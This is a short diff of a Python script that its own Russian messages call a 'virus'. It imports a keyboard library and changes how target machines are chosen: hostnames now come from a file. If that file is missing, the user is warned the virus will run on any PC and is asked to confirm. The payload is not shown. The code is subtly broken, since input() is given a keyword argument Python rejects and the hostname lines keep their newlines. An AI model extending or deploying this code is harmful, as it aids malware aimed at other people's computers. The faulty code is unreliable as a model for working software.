@@ -14,8 +14,23 @@ try:
     import keyboard
 except ImportError:
     keyboard = None
-
-TARGET_HOSTS = ["pc-gstuxilg"]
+try:
+    with open("Save_PC_name.txt", 'r', encoding="utf-8") as f:
+        TARGET_HOSTS = f.readlines()
+        print(TARGET_HOSTS)
+except:
+    print("Ошибка при чтении файла Save_PC_name.txt")
+    print("[!] Внимание если продолжите вирус запуститься на любом пк")
+    while True:
+        agreed = input(object = "Хотите продолжить? y/n")
+        if agreed == "y":
+            print("Продолжаем")
+            break
+        elif agreed == "n":
+            print("Выключаем программу")
+            sys.exit()
+        else:
+            print("Ввод не распознан повторите попытку")
 
 num_colors = {
     1: "#0000FF",
